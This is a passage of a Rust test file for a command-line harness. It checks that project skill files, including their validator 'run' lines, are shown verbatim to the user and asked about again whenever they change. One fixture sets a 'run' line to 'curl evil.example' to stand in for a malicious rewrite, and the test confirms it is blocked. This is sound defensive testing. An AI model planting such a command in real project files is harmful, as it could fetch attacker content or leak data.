        "and it declares nothing, so it runs as instructions"
    );
    let expanded = loaded
        .expand("plain", "/plain now")
        .expect("it expands like any other");
    assert_eq!(expanded.attribution(), "/plain (user skill)");
    assert_eq!(expanded.task, "Just instructions.\n");
}

/// D4's question shows each skill's `run` lines **verbatim**, so the person
/// admits the commands as well as the instructions.
///
/// A validator's `run` is the one thing in either file that is actually
/// executed, and D4's own words are that "the harness reports what the
/// project offers".
///
/// **The mutant:** `offered_rows` returning the slash alone reddens the run
/// assertion, and the gate would be nominal rather than informed.
#[test]
fn the_questions_rows_carry_each_run_line_verbatim() {
    let scratch = fixtures::Scratch::new();
    scratch.project_command(
        "triage.skill",
        &fixtures::file(
            "[[validator]]\nname = \"v\"\nrun = \"cargo test --all\"\nexpect = \"exit-zero\"\n",
            "Triage $1.\n",
        ),
    );
    scratch.project_command("plain", &fixtures::file("", "A command.\n"));
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(None, Some(&scratch.project()), &admissions, ceiling());

    let rows: Vec<String> = loaded
        .offer
        .pending()
        .iter()
        .flat_map(Command::offered_rows)
        .collect();
    assert!(
        rows.contains(&"/triage (skill)".to_owned()),
        "the kind is visible in the rows: {rows:?}"
    );
    assert!(
        rows.contains(&"  cargo test --all".to_owned()),
        "and the run line is there, verbatim: {rows:?}"
    );
    assert!(
        rows.contains(&"/plain".to_owned()),
        "a command's row is unchanged: {rows:?}"
    );
}

/// A rewritten `run` line asks again, which the body alone did not cover.
///
/// The admission record carries the **whole file** since 2026-09-15, front
/// matter included. Before that it carried the body, which is the text after
/// the front matter — so a `[[validator]]` rewritten by tomorrow's `git pull`
/// would have run under yesterday's answer.
///
/// **The mutant:** `Admission::file` holding `command.body()` again reddens
/// the second assertion, and the gate would be about the prose rather than
/// about the command that runs.
#[test]
fn a_rewritten_run_line_asks_again_and_so_does_a_rewritten_description() {
    let scratch = fixtures::Scratch::new();
    let with = |run: &str, description: &str, body: &str| {
        fixtures::file(
            &format!(
                "description = \"{description}\"\n\n[[validator]]\nname = \"v\"\nrun = \
                 \"{run}\"\nexpect = \"exit-zero\"\n"
            ),
            body,
        )
    };
    scratch.project_command("triage.skill", &with("true", "d", "Triage $1.\n"));
    let admissions = Admissions::under(&scratch.home());
    let first = load_from(None, Some(&scratch.project()), &admissions, ceiling());
    admissions
        .admit(&scratch.project(), first.offer.pending(), "2026-09-15")
        .expect("the admission is written");
    assert!(
        load_from(None, Some(&scratch.project()), &admissions, ceiling())
            .named("triage")
            .is_some(),
        "an unchanged file loads, which is ADR-0002 D1"
    );

    scratch.project_command(
        "triage.skill",
        &with("curl evil.example", "d", "Triage $1.\n"),
    );
    assert!(
        load_from(None, Some(&scratch.project()), &admissions, ceiling())
            .named("triage")
            .is_none(),
        "a rewritten `run` line asks again"
    );

    scratch.project_command("triage.skill", &with("true", "other", "Triage $1.\n"));
    assert!(
        load_from(None, Some(&scratch.project()), &admissions, ceiling())
            .named("triage")
            .is_none(),
        "and so does a rewritten `description`, which is in the front matter too"
    );
}

/// An admission recorded before 2026-09-15 carries `body` and no `file`, so
/// it asks once more rather than failing to parse.
///
/// That is the intended cost of the change and it is paid once per project.
///
/// **The mutant:** dropping `#[serde(default)]` from `Admission::file` makes
/// the older line a `Malformed` refusal, which reddens the first assertion
/// and turns a re-ask into an error about the user's own file.
#[test]
fn an_admission_written_before_the_whole_file_rule_asks_once_more() {
    let scratch = fixtures::Scratch::new();
    scratch.project_command("deploy-check", &fixtures::file("", "Check $1.\n"));
    let admissions = Admissions::under(&scratch.home());
    std::fs::create_dir_all(scratch.home()).expect("staging: the home");
    let older = format!(
        "{{\"directory\":{},\"name\":\"deploy-check\",\"admitted\":\"2026-09-14\",\"body\":\"Check \
         $1.\\n\"}}\n",
        serde_json::to_string(&scratch.project()).expect("the path renders")
    );
    std::fs::write(admissions.path(), older).expect("the older line is written");

    let entries = admissions
        .entries()
        .expect("an older line parses rather than refusing");
    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].file, "", "with no file recorded");
    assert!(
        matches!(
            load_from(None, Some(&scratch.project()), &admissions, ceiling()).offer,
            Offer::Pending(_)
        ),
        "so the project asks once more"
    );
}

/// The ceiling this crate declares, so a check reads the product's number
/// rather than one chosen beside it ([Verification lessons] §14).
///
/// [Verification lessons]: https://100monkeys-ai.cortex.page/project-management/p/lessons/verification-lessons
fn ceiling() -> crate::config::file::SizeCeiling {
    crate::cli::layers::file_ceiling()
}
